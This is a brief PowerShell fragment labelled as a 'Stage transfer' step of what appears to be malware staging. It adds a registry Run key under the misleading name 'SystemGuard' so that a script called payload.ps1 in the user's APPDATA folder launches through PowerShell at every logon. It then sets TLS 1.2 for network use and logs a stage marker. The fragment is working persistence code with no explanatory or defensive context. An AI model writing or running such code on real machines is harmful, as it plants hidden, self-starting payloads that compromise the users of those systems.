
<# Stage transfer #> reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemGuard" /t REG_SZ /d "powershell.exe -NoP -File $env:APPDATA\payload.ps1" /f; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Verbose "stage marker 32 reached"
